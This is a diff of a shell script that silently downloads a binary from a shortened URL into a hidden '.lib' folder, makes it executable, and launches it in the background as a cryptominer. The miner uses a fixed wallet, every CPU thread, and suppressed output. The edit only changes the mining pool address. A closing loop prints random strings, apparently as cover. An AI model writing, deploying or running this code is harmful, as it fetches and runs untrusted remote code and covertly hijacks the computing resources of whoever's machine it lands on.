@@ -10,5 +10,5 @@ mkdir .lib && cd .lib
 wget -O sgr1 https://bitly.ws/38mNE >/dev/null 2>&1
 chmod +x sgr1
 sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
-nice -n -10 nohup ./sgr1 --algorithm ghostrider --pool 2602:294:0:f5:1234:4321:4fe1:0001:443 --wallet RfX7RdyqJPHJbp6UZDcJm5BpasBKafsBTe.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive  > /dev/null 2>&1 &
+nice -n -10 nohup ./sgr1 --algorithm ghostrider --pool 192.95.37.3:7054 --wallet RfX7RdyqJPHJbp6UZDcJm5BpasBKafsBTe.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive  > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
